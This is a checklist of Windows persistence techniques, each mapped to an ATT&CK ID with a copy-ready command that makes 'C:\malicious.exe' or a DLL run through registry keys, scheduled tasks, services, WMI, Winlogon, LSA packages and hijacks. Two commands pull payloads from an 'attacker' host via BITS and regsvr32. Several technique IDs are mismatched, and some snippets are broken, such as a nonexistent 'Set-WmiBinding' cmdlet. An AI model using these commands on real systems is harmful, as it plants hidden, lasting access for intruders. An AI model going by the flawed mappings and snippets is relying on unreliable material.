# Windows Persistence Techniques

- [ ] **Registry Run Key (HKCU) (T1547.001)**  
```powershell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\malicious.exe" /f
```

- [ ] **Registry Run Key (HKLM) (T1547.001)**  
```powershell
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\malicious.exe" /f
```

- [ ] **Startup Folder Shortcut (T1547.001)**  
```powershell
copy "C:\malicious.lnk" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
```

- [ ] **All Users Startup Folder (T1547.001)**  
```powershell
copy "C:\malicious.lnk" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
```

- [ ] **Scheduled Task At Logon (T1053.003)**  
```powershell
schtasks /Create /SC ONLOGON /TN "Updater" /TR "C:\malicious.exe" /RL HIGHEST
```

- [ ] **Scheduled Task At Startup (T1053.003)**  
```powershell
schtasks /Create /SC ONSTARTUP /TN "Updater" /TR "C:\malicious.exe" /RL HIGHEST
```

- [ ] **Scheduled Task On Event (T1053.005)**  
```powershell
schtasks /Create /SC ONEVENT /TN "Updater" /TR "C:\malicious.exe" /EC Application /MO "*[System[EventID=1000]]"
```

- [ ] **Windows Service (T1543.003)**  
```powershell
sc create MalService binPath= "C:\malicious.exe" start= auto
```

- [ ] **WMI Event Subscription (T1546.003)**  
```powershell
powershell "$filter = Set-WmiInstance -Namespace Root\Subscription -Class __EventFilter -Argument @{Name='MyFilter';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent ...'}; $consumer = Set-WmiInstance -Namespace Root\Subscription -Class CommandLineEventConsumer -Argument @{Name='MyConsumer';CommandLineTemplate='C:\malicious.exe'}; Set-WmiBinding -Filter $filter -Consumer $consumer"
```

- [ ] **DLL Search Order Hijacking (T1574.001)**  
```powershell
copy malicious.dll "C:\Program Files\App\xmllite.dll"
```

- [ ] **AppInit_DLLs (T1547.004)**  
```powershell
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\malicious.dll" /f
```

- [ ] **Image File Execution Options (T1546.005)**  
```powershell
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "C:\malicious.exe" /f
```

- [ ] **COM Hijacking (T1546.002)**  
```powershell
reg add "HKCU\Software\Classes\CLSID\{CLSID-GUID}\InprocServer32" /ve /t REG_SZ /d "C:\malicious.dll" /f
```

- [ ] **BITS Job (T1197)**  
```powershell
powershell "Import-Module BitsTransfer; Start-BitsTransfer -Source 'C:\malicious.exe' -Destination 'C:\Windows\Temp\malicious.exe'; $job = Start-BitsTransfer -Source 'http://attacker/payload.exe' -Destination 'C:\Windows\Temp\payload.exe' -Description 'Updater';$job | Set-BitsTransfer -NotifyFlags Transferred; $job | Resume-BitsTransfer"
```

- [ ] **Security Support Provider (T1547.005)**  
```powershell
reg add "HKLM\System\CurrentControlSet\Control\Lsa\Security Packages" /t REG_MULTI_SZ /d "malicious" /f
```

- [ ] **Authentication Package (T1547.002)**  
```powershell
reg add "HKLM\System\CurrentControlSet\Control\Lsa\Authentication Packages" /t REG_MULTI_SZ /d "malicious" /f
```

- [ ] **Winlogon Notify (T1547.004)**  
```powershell
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\Updater" /v DLLName /t REG_SZ /d "C:\malicious.dll" /f
```

- [ ] **Winlogon Userinit (T1547.004)**  
```powershell
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe, C:\malicious.exe" /f
```

- [ ] **Winlogon Shell (T1547.004)**  
```powershell
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe C:\malicious.exe" /f
```

- [ ] **PowerShell Profile (T1546.011)**  
```powershell
powershell "Add-Content -Path $profile -Value 'C:\malicious.exe'"
```

- [ ] **Active Setup (T1547.006)**  
```powershell
reg add "HKLM\Software\Microsoft\Active Setup\Installed Components\{12345678-1234-1234-1234-1234567890AB}" /v StubPath /t REG_SZ /d "C:\malicious.exe" /f
```

- [ ] **Browser Helper Object (T1176)**  
```powershell
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{GUID}" /ve /t REG_SZ /d "C:\malicious.dll" /f
```

- [ ] **Office Trusted Location (T1218)**  
```powershell
reg add "HKCU\Software\Microsoft\Office\16.0\Word\Security\Trusted Locations\Location1" /v Path /t REG_SZ /d "C:\malicious" /f
```

- [ ] **MSHTA Execution (T1170)**  
```powershell
reg add "HKCU\Software\Classes\ms-its\shell\open\command" /ve /t REG_SZ /d "mshta C:\malicious.hta" /f
```

- [ ] **URL Protocol Handler (T1189)**  
```powershell
reg add "HKCR\myapp\shell\open\command" /ve /t REG_SZ /d "C:\malicious.exe" /f
```

- [ ] **Installer Package (T1218.011)**  
```powershell
regsvr32 /s /n /i:"http://attacker/malicious.dll" scrobj.dll
```

- [ ] **Time Provider (T1547.003)**  
```powershell
reg add "HKLM\System\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient" /v Enabled /t REG_DWORD /d 1 /f
```

- [ ] **RunOnce Key (T1547.001)**  
```powershell
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Updater" /t REG_SZ /d "C:\malicious.exe" /f
```

- [ ] **RunOnceEx Key (T1547.001)**  
```powershell
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx\Updater" /v 1 /t REG_SZ /d "C:\malicious.exe" /f
```

- [ ] **Shell Extensions (T1547.008)**  
```powershell
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Approved" /ve /t REG_SZ /d "{GUID}" /f
```

- [ ] **Group Policy Preferences (T1569.002)**  
```powershell
REGEDIT5
[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Group Policy\Preferences\ScheduledTasks\Task1]
"TaskName"="Updater"
"Action"="Create"
"CommandLine"="C:\malicious.exe"
```

- [ ] **Shortcut Modification (T1023)**  
```powershell
powershell "(New-Object -ComObject WScript.Shell).CreateShortcut('$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.lnk').TargetPath='C:\malicious.exe';$_.Save()"
```

- [ ] **MsiExec Persistence (T1568.002)**  
```powershell
msiexec /i C:\malicious.msi /qn
```

- [ ] **CPL File Hijack (T1547.002)**  
```powershell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ControlPanel\NameSpace\{GUID}" /ve /t REG_SZ /d "C:\malicious.dll" /f
```

- [ ] **Custom Protocol Hijack (T1189)**  
```powershell
reg add "HKCU\Software\Classes\ms-screenclip\shell\open\command" /ve /t REG_SZ /d "C:\malicious.exe \"%1\"" /f
```

- [ ] **Ntfs Transactional File (T1560)**  
```powershell
powershell "Start-Transaction; Copy-Item C:\malicious.exe -Destination C:\Windows\Temp\mal.exe -Transacted; Complete-Transaction"
```

- [ ] **AppCert DLLs (T1546.008)**  
```powershell
reg add "HKLM\System\CurrentControlSet\Control\Session Manager" /v AppCertDLLs /t REG_MULTI_SZ /d "C:\malicious.dll" /f
```

- [ ] **Service Trigger (T1543.004)**  
```powershell
sc triggerinfo MalService start/onconnect type=0x13
```

